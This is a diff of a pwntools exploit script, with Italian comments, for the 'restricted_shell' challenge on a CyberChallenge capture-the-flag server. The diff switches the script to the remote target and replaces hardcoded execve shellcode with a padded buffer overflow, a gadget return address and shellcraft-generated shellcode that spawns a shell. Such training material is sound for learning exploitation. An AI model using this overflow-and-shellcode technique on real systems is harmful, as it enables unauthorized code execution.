@@ -11,9 +11,10 @@ def main():
     '''
     HOST = "shell.challs.cyberchallenge.it"
     PORT = 9123
-    #r = remote(HOST, PORT)
+    r = remote(HOST, PORT)
     exe = ELF("./restricted_shell")
-    r = process(exe.path)
+    context.binary = exe
+    #r = process(exe.path)
 
 
     # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
@@ -28,11 +29,11 @@ def main():
 
     # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"
 
-    input_address = p32(0xffffd8a0, endianness='little')
-    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
-    string = "a" * 16
+    return_address = p32(0x08048593, endianness='little') #gadget address
+    string = "a" * 44 #40 buff bytes + 4 frame pointer bytes
     string_bytes = str.encode(string)
-    payload =  shellcode + string_bytes + p32(0xffffd8a0, endianness='little')
+    payload = string_bytes + return_address + asm(shellcraft.sh())
+
     print(type(payload))
     print(payload)
     r.sendlineafter(b"restricted-shell c:\ > ", payload)
@@ -40,11 +41,9 @@ def main():
     data = r.recv(1024)
     print(data)
 
-    data = r.recv(1024)
-    print(data)
 
     # permette di interagire con la connessione direttamente dalla shell
-    #r.interactive()
+    r.interactive()
 
     # chiude la socket
     r.close()
